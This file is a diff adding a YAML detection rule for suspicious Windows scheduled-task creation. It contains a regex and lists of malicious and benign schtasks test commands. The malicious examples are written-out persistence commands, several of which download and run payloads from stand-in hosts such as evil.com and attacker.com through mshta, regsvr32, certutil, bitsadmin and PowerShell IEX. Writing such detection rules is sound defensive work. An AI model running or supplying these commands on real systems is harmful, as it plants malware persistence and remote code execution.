@@ -1,0 +1,62 @@
+name: experimental-medium-20-scheduled-task
+severity: medium-experimental
+description: >
+  Detects scheduled task creation with suspicious commands. Persistence mechanism for malware.
+  PowerShell with hidden windows or encoded commands, binaries in temp/public/appdata directories, script
+  hosts executing from suspicious paths, download utilities (certutil, bitsadmin), and tasks scheduled to
+  run at very frequent intervals (every minute) which is unusual for legitimate automation. This pattern
+  is experimental medium-severity because enterprise environments extensively use scheduled tasks for
+  legitimate automation, backups, monitoring, and software deployment, requiring careful allowlisting
+  and context analysis. Detection focuses on /create combined with suspicious /tr (task run) parameters
+  containing malicious indicators.
+
+pattern: |
+  (?i)schtasks(?:\.exe)?[\s\r\n]+/create[\s\r\n]+(?:[^\r\n]*?/tn[\s\r\n]+[^\r\n]+[\s\r\n]+)?/tr[\s\r\n]+(?:['"])?[^\r\n]*?(?:powershell|cmd|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|C:\\(?:Windows\\Temp|Temp|Users\\[^\\]+\\AppData|Users\\Public|ProgramData)|/tmp|-enc(?:odedcommand)?|-w\s+h(?:idden)?|-ep\s+b(?:ypass)?|-nop(?:rofile)?|http://|https://|IEX|Invoke-Expression|DownloadString)
+
+malicious:
+  - 'schtasks /create /tn "Backdoor" /tr "powershell -enc payload" /sc onlogon'
+  - "schtasks.exe /create /tn Malware /tr \"C:\\Temp\\evil.exe\" /sc daily"
+  - 'schtasks /create /tn "Update" /tr "mshta http://evil.com/payload.hta" /sc onstart'
+  - "schtasks.exe /create /tn Persistence /tr \"cmd /c C:\\Windows\\Temp\\backdoor.bat\" /sc minute"
+  - 'schtasks /create /tn WindowsDefender /tr "powershell -w hidden -nop -ep bypass -c IEX(IWR http://evil.com/s.ps1)" /sc onlogon /f'
+  - "schtasks.exe /create /tn SecurityUpdate /tr \"C:\\Users\\Public\\clickfix.exe\" /sc onstart /ru SYSTEM"
+  - "schtasks /create /tn \"System Check\" /tr \"wscript C:\\ProgramData\\backdoor.vbs\" /sc daily /st 00:00"
+  - "schtasks.exe /create /tn AdobeUpdate /tr \"cscript C:\\Users\\victim\\AppData\\Local\\Temp\\dropper.js\" /sc onlogon"
+  - 'schtasks /create /tn ChromeUpdate /tr "mshta javascript:eval(''malicious code'')" /sc onstart /f'
+  - "schtasks.exe /create /tn Maintenance /tr \"rundll32 C:\\Temp\\trojan.dll,EntryPoint\" /sc daily /st 12:00"
+  - 'schtasks /create /tn "Windows Update" /tr "regsvr32 /s /i http://evil.com/payload.sct scrobj.dll" /sc onlogon'
+  - 'schtasks.exe /create /tn GoogleUpdate /tr "certutil -urlcache -f http://evil.com/mal.exe mal.exe && mal.exe" /sc minute /mo 15'
+  - 'schtasks /create /tn Defender /tr "powershell -encodedcommand SGFja2VkISBZb3UncmUgY29tcHJvbWlzZWQh" /sc onstart /ru SYSTEM /f'
+  - "schtasks.exe /create /tn \"Office Update\" /tr \"cmd.exe /c powershell -w hidden C:\\Windows\\Temp\\implant.ps1\" /sc daily"
+  - 'schtasks /create /tn SystemService /tr "bitsadmin /transfer job http://evil.com/backdoor.exe backdoor.exe && backdoor.exe" /sc onlogon'
+  - "schtasks.exe /create /tn \"Java Update\" /tr \"C:\\Users\\victim\\AppData\\Roaming\\ransomware.exe\" /sc onstart /f"
+  - 'schtasks /create /tn MicrosoftEdgeUpdate /tr "powershell -nop -w h -c (New-Object Net.WebClient).DownloadString(''http://evil.com/p.ps1'')|IEX" /sc onlogon'
+  - "schtasks.exe /create /tn Svchost /tr \"wscript //B C:\\ProgramData\\persistence.vbs\" /sc minute /mo 30"
+  - "schtasks /create /tn \"Driver Update\" /tr \"mshta.exe C:\\Temp\\malicious.hta\" /sc daily /st 08:00 /ru SYSTEM"
+  - "schtasks.exe /create /tn Updater /tr \"cscript //nologo C:\\Users\\Public\\loader.js\" /sc onstart"
+  - 'schtasks /create /tn SystemCheck /tr "powershell Invoke-Expression (Invoke-WebRequest http://attacker.com/stage2.ps1)" /sc onlogon /f'
+  - "schtasks.exe /create /tn \"Network Service\" /tr \"rundll32.exe C:\\Windows\\Temp\\evil.dll,Run\" /sc daily"
+  - "schtasks /create /tn Backup /tr \"cmd /c C:\\ProgramData\\clickfix-installer.bat\" /sc onstart /ru SYSTEM"
+  - "schtasks.exe /create /tn \"Security Scan\" /tr \"regsvr32 /u C:\\Temp\\trojan.dll\" /sc minute /mo 60"
+
+benign:
+  - "schtasks /create /tn \"Backup\" /tr \"C:\\Scripts\\backup.bat\" /sc daily"
+  - "schtasks.exe /create /tn Maintenance /tr \"C:\\Program Files\\App\\update.exe\" /sc weekly"
+  - "schtasks /query"
+  - "schtasks /delete /tn TaskName"
+  - "schtasks.exe /create /tn \"Database Backup\" /tr \"C:\\Admin\\Scripts\\db-backup.ps1\" /sc daily /st 02:00"
+  - "schtasks /create /tn MonitorService /tr \"C:\\Program Files (x86)\\Monitoring\\agent.exe\" /sc onstart /ru SYSTEM"
+  - "schtasks.exe /create /tn \"Update Check\" /tr \"C:\\IT\\Scripts\\check-updates.vbs\" /sc weekly /d SUN"
+  - "schtasks /create /tn DiskCleanup /tr \"C:\\Windows\\System32\\cleanmgr.exe /sagerun:1\" /sc monthly"
+  - "schtasks.exe /create /tn \"Log Rotation\" /tr \"C:\\Scripts\\rotate-logs.bat\" /sc daily /st 00:00"
+  - "schtasks /end /tn TaskName"
+  - "schtasks.exe /run /tn ExistingTask"
+  - "schtasks /create /tn \"Antivirus Scan\" /tr \"C:\\Program Files\\Antivirus\\scanner.exe /fullscan\" /sc weekly /d SAT /st 22:00"
+  - "schtasks.exe /change /tn TaskName /enable"
+  - "schtasks /create /tn ReportGeneration /tr \"C:\\Enterprise\\Reports\\generate.exe\" /sc daily /st 06:00 /ru Administrator"
+  - "schtasks.exe /query /tn TaskName"
+  - "schtasks /create /tn \"System Maintenance\" /tr \"C:\\Windows\\System32\\Dism.exe /Online /Cleanup-Image /StartComponentCleanup\" /sc monthly"
+  - "schtasks.exe /create /tn DataSync /tr \"C:\\Program Files\\Company\\sync-tool.exe\" /sc hourly"
+  - 'schtasks /create /tn "Disk Defrag" /tr "defrag C: /O" /sc weekly /d TUE /st 03:00'
+  - "schtasks.exe /create /tn EventLogArchive /tr \"C:\\Scripts\\archive-eventlogs.ps1\" /sc weekly"
+  - "schtasks /create /tn \"Software Update\" /tr \"C:\\Program Files\\Updater\\check-update.exe\" /sc daily /st 09:00"
